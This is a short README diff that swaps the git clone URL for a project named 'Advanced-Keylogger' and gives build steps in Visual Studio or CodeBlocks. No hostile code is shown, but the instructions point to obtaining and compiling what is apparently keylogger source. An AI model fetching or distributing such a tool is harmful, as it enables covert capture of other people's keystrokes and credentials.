@@ -63,7 +63,7 @@ A step by step series of examples that tell you have to get a development enviro
 Download the repository using either bash or the browser
 
 ```
-git clone https://github.com/EngAhmedSalah/Advanced-Keylogger
+git clone https://github.com/recursive-bot/Advanced-Keylogger.git
 ```
 
 Open the solution file in [Visual Studio or CodeBlocks 16 or higher] using the sln file
